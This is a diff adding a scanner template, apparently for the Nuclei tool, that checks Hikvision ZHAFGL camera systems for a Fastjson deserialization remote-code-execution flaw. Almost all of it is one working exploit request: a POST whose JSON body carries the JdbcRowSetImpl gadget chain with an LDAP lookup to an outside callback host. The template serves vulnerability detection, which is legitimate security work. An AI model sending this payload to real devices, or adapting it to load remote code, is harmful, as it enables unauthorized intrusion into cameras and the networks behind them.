@@ -1,0 +1,31 @@
+id: HIKVISION-ZHAFGL-Fastjson-RCE
+
+info:
+  name: 海康威视(hikvision) ZHAFGL - Fastjson RCE
+  author: wintry
+  description: 海康威视网络摄像机因为使用了带漏洞的版本的Fastjson组件,导致反序列化远程命令执行漏洞.
+  remediation: 联系厂商修复.
+  severity: critical
+  tags: hikvision
+
+http:
+  - raw:
+      - |              
+        POST /bic/ssoService/v1/applyCT HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Dnt: 1
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: cross-site
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 200
+
+        {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh}}/{{body}}","autoCommit":true},"hfe4zyyzldp":"="}
